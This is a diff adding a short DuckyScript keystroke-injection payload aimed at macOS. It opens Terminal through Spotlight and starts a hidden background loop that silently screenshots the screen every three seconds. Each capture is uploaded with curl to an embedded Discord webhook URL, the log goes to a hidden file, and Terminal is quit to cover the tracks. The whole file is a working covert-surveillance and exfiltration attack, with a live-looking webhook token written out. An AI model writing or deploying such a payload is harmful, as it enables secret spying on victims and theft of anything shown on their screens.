@@ -1,0 +1,13 @@
+REM kill it with pkill -f screencapture
+
+DEFAULT_DELAY 200
+GUI space
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 800
+STRING nohup bash -c 'while true; do screencapture -x /tmp/screen.png && curl -s -F "file=@/tmp/screen.png" https://discord.com/api/webhooks/1394745026390655158/uns0smPG9rmF0tT1W_qwUBmacHbT_MPJy8uJjAidEI_m80Yi0eryhjjAFnr8KeLDDwfo && rm /tmp/screen.png; sleep 3; done' > /tmp/.siphon.log 2>&1 &
+ENTER
+DELAY 800
+GUI q
+ENTER
